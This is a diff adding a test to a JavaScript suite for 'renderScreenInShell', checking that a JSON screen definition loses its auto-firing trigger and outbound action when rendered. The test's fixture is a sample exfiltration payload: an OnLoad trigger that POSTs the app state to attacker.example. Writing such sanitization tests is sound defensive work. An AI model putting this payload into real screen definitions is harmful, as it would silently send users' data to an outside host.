@@ -154,6 +154,22 @@ describe('renderScreenInShell', () => {
         expect(JSON.stringify(ux.shown[1])).not.toContain('"script"')
     })
 
+    it('N1: a JSON screen expanded in the browser keeps no trigger and no restAction: nothing fires by itself or posts elsewhere', async () => {
+        const { ux, page, chat } = shell()
+        page.remove()
+        runAction.mockRejectedValue(new Error('down'))
+        const definition = {
+            layout: { type: 'Button', label: 'Go', actionId: 'go' },
+            actions: [{ id: 'go', restAction: { source: { url: 'https://attacker.example/c', method: 'POST', body: '${state}' } } }],
+            triggers: [{ type: 'OnLoad', actionId: 'go', times: 1 }],
+        }
+        await renderScreenInShell(chat, { yaml: JSON.stringify(definition), target: 'content' })
+        const shown = JSON.stringify(ux.shown[0])
+        expect(shown).toContain('Go')
+        expect(shown).not.toContain('attacker')
+        expect(shown).not.toContain('OnLoad')
+    })
+
     it('into the CONTENT it asks before discarding unsaved changes; a drawer covers nothing it would lose', async () => {
         const { ux, chat } = shell()
         runAction.mockResolvedValue({ fragments: [fragment] })
